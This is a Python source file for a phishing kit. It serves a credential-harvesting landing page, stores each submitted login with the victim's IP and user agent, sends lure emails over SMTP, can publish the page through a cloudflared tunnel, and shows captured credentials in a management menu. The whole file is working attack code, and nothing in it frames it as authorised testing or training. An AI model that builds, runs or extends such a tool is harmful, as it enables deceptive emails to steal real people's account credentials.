import http.server
import socketserver
import threading
import socket
import json
import time
from datetime import datetime
from urllib.parse import parse_qs
from utils import get_db, success, error, info, color_input, ask_yes_no, Fore, Style
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email_templates import list_templates, get_template_content, ensure_template_folder

running_server = None
server_thread = None
current_attack_id = None
captured_creds = []


class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    landing_html = ""
    attack_id = None
    redirect_url = "https://www.google.com"

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/?"):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(self.landing_html.encode())
        else:
            super().do_GET()

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode()
        ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "")
        form_fields = parse_qs(post_data)
        flat = {k: v[0] for k, v in form_fields.items()}
        creds_str = json.dumps(flat)
        captured_creds.append((ip, user_agent, flat))
        conn = get_db()
        conn.execute(
            "INSERT INTO captured_credentials (attack_id, ip, user_agent, form_data) VALUES (?,?,?,?)",
            (self.attack_id, ip, user_agent, creds_str),
        )
        conn.commit()
        conn.close()
        print(
            Fore.GREEN
            + f"\n[+] Credentials captured from {ip}: {flat}"
            + Style.RESET_ALL
        )
        self.send_response(302)
        self.send_header("Location", self.redirect_url)
        self.end_headers()


def start_local_server(landing_html, attack_id, redirect_url, port=0):
    global running_server, server_thread, current_attack_id
    handler = PhishingHandler
    handler.landing_html = landing_html
    handler.attack_id = attack_id
    handler.redirect_url = redirect_url
    if port == 0:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("", 0))
        port = sock.getsockname()[1]
        sock.close()
    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer(("0.0.0.0", port), handler)
    running_server = httpd
    current_attack_id = attack_id
    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()
    return port


def stop_server():
    global running_server, current_attack_id
    if running_server:
        running_server.shutdown()
        running_server = None
    current_attack_id = None


def send_email(smtp_config, target_email, template_html, link):
    name = target_email.split("@")[0].capitalize() if "@" in target_email else "User"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html = template_html.replace("{{name}}", name).replace("{{email}}", target_email)
    html = html.replace("{{date}}", now).replace("{{link}}", link)
    msg = MIMEMultipart("alternative")
    msg["Subject"] = "Important Notification"
    msg["From"] = (
        f"{smtp_config['from_name'] or smtp_config['username']} <{smtp_config['username']}>"
    )
    msg["To"] = target_email
    msg.attach(MIMEText(html, "html"))
    try:
        if smtp_config["encryption"] == "SSL":
            server = smtplib.SMTP_SSL(
                smtp_config["server"], smtp_config["port"], timeout=15
            )
        else:
            server = smtplib.SMTP(
                smtp_config["server"], smtp_config["port"], timeout=15
            )
            server.starttls()
        server.login(smtp_config["username"], smtp_config["password"])
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        error(f"Email sending failed: {e}")
        return False


def attack_flow(is_public=False):
    ensure_template_folder()
    template_files = list_templates()
    if not template_files:
        error("No email templates. Please add one first (Option 3).")
        return
    print("\nSelect Email Template:")
    for idx, name in enumerate(template_files, 1):
        print(f"[{idx}] {name}")
    tid_str = color_input("Template ID: ").strip()
    try:
        tid = int(tid_str)
    except ValueError:
        error("Invalid ID.")
        return
    template_html = get_template_content(tid)
    if template_html is None:
        error("Invalid template.")
        return
    template_name = template_files[tid - 1]

    conn = get_db()
    pages = conn.execute("SELECT * FROM landing_pages").fetchall()
    if not pages:
        error("No landing pages. Please add one first (Option 4).")
        conn.close()
        return
    print("\nSelect Landing Page:")
    for p in pages:
        print(f"[{p['id']}] {p['name']}  (redirect: {p['redirect_url']})")
    pid = color_input("Page ID: ").strip()
    page = conn.execute("SELECT * FROM landing_pages WHERE id=?", (pid,)).fetchone()
    if not page:
        error("Invalid page.")
        conn.close()
        return
    redirect_url = page["redirect_url"]

    smtp_configs = conn.execute("SELECT * FROM smtp_configs").fetchall()
    if not smtp_configs:
        error("Please configure SMTP first (Option 5).")
        conn.close()
        return
    smtp_cfg = None
    if len(smtp_configs) == 1:
        smtp_cfg = smtp_configs[0]
    else:
        print("\nSelect SMTP Configuration:")
        for sc in smtp_configs:
            print(f"[{sc['id']}] {sc['server']} ({sc['username']})")
        sid = color_input("SMTP ID: ").strip()
        smtp_cfg = conn.execute(
            "SELECT * FROM smtp_configs WHERE id=?", (sid,)
        ).fetchone()
        if not smtp_cfg:
            error("Invalid SMTP config.")
            conn.close()
            return

    attack_type = "public" if is_public else "local"
    cur = conn.execute(
        "INSERT INTO attacks (attack_type, email_template_id, landing_page_id, smtp_config_id, status) VALUES (?,?,?,?,?)",
        (attack_type, template_name, page["id"], smtp_cfg["id"], "preparing"),
    )
    attack_id = cur.lastrowid
    conn.commit()

    port = start_local_server(page["content"], attack_id, redirect_url)
    link = f"http://localhost:{port}"
    if is_public:
        from cloudflared_manager import start_cloudflared_tunnel

        public_url = start_cloudflared_tunnel(port)
        if not public_url:
            error("Failed to start cloudflared tunnel.")
            stop_server()
            conn.execute(
                "UPDATE attacks SET status=? WHERE id=?", ("failed", attack_id)
            )
            conn.commit()
            conn.close()
            return
        link = public_url
        info(f"Public URL: {public_url}")
    info(f"Server running at {link}")

    send = ask_yes_no("Send phishing email?")
    if send:
        target = color_input("Enter target email address: ").strip()
        if send_email(smtp_cfg, target, template_html, link):
            success("Email sent successfully.")
            conn.execute(
                "UPDATE attacks SET emails_sent=emails_sent+1, status=? WHERE id=?",
                ("active", attack_id),
            )
        else:
            conn.execute(
                "UPDATE attacks SET status=? WHERE id=?", ("email_failed", attack_id)
            )
        conn.commit()
    else:
        conn.execute("UPDATE attacks SET status=? WHERE id=?", ("active", attack_id))
        conn.commit()

    print(
        Fore.YELLOW
        + "\n[*] Waiting for credentials... Press Ctrl+C to stop.\n"
        + Style.RESET_ALL
    )
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n")
        info("Stopping server...")
        stop_server()
        conn.execute(
            "UPDATE attacks SET status=?, credentials_captured=? WHERE id=?",
            ("completed", len(captured_creds), attack_id),
        )
        conn.commit()
        success(f"Attack finished. {len(captured_creds)} credentials captured.")
    finally:
        conn.close()
        captured_creds.clear()


# ---------- FIXED recent_attacks ----------
def recent_attacks():
    conn = get_db()
    attacks = conn.execute("""
        SELECT a.*, l.name as landing_name, s.server as smtp_server
        FROM attacks a
        LEFT JOIN landing_pages l ON a.landing_page_id = l.id
        LEFT JOIN smtp_configs s ON a.smtp_config_id = s.id
        ORDER BY a.timestamp DESC LIMIT 20
    """).fetchall()

    if not attacks:
        info("No recent attacks.")
        conn.close()
        return

    print(
        "\n{:<4} {:<20} {:<8} {:<25} {:<20} {:<18} {:<6} {:<5} {:<12}".format(
            "ID",
            "Timestamp",
            "Type",
            "Email Template",
            "Landing Page",
            "SMTP Server",
            "Sent",
            "Creds",
            "Status",
        )
    )
    print("-" * 110)
    for a in attacks:
        print(
            "{:<4} {:<20} {:<8} {:<25} {:<20} {:<18} {:<6} {:<5} {:<12}".format(
                a["id"],
                a["timestamp"][:19] if a["timestamp"] else "",
                a["attack_type"],
                a["email_template_id"] or "N/A",
                a["landing_name"] or "N/A",
                a["smtp_server"] or "N/A",
                a["emails_sent"],
                a["credentials_captured"],
                a["status"] or "",
            )
        )

    while True:
        prompt = (
            color_input(
                "\nEnter attack ID to manage (or type 'exit' / press Enter to return): "
            )
            .strip()
            .lower()
        )
        if prompt == "" or prompt == "exit":
            break
        if not prompt.isdigit():
            error("Invalid input.")
            continue
        attack_id = int(prompt)
        attack = conn.execute(
            "SELECT * FROM attacks WHERE id=?", (attack_id,)
        ).fetchone()
        if not attack:
            error("Attack ID not found.")
            continue

        # Sub-menu for the selected attack
        while True:
            print(
                Fore.YELLOW + f"\n=== Manage Attack #{attack_id} ===" + Style.RESET_ALL
            )
            print(f"Status: {attack['status']}")
            print("[1] View Captured Credentials")
            if attack["status"] in ("active", "preparing"):
                print("[2] Stop This Attack (Deactivate)")
            print("[0] Back to Attack List")
            sub_choice = color_input("Choice: ").strip()
            if sub_choice == "1":
                creds = conn.execute(
                    "SELECT * FROM captured_credentials WHERE attack_id=? ORDER BY timestamp",
                    (attack_id,),
                ).fetchall()
                if not creds:
                    info(f"No credentials captured for attack #{attack_id}.")
                else:
                    print(
                        Fore.YELLOW
                        + f"\n=== Captured Credentials for Attack #{attack_id} ==="
                        + Style.RESET_ALL
                    )
                    for i, c in enumerate(creds, 1):
                        print(f"\n--- Entry {i} ---")
                        print(f"Timestamp : {c['timestamp']}")
                        print(f"IP        : {c['ip']}")
                        print(f"User-Agent: {c['user_agent']}")
                        try:
                            form_data = json.loads(c["form_data"])
                            print("Fields    :")
                            for key, value in form_data.items():
                                print(f"  {key}: {value}")
                        except:
                            print(f"Raw data  : {c['form_data']}")
                    print()
                input("Press Enter to continue...")
            elif sub_choice == "2" and attack["status"] in ("active", "preparing"):
                confirm = (
                    input(
                        Fore.RED
                        + f"Stop attack #{attack_id}? This will shut down the server if it is still running. (y/n): "
                        + Style.RESET_ALL
                    )
                    .strip()
                    .lower()
                )
                if confirm == "y":
                    global running_server, current_attack_id
                    if current_attack_id == attack_id:
                        info("Shutting down the running server...")
                        stop_server()
                    conn.execute(
                        "UPDATE attacks SET status=? WHERE id=?", ("stopped", attack_id)
                    )
                    conn.commit()
                    success(
                        f"Attack #{attack_id} deactivated (status set to 'stopped')."
                    )
                    attack = conn.execute(
                        "SELECT * FROM attacks WHERE id=?", (attack_id,)
                    ).fetchone()
                break
            elif sub_choice == "0":
                break
            else:
                error("Invalid choice or action not available.")
    conn.close()
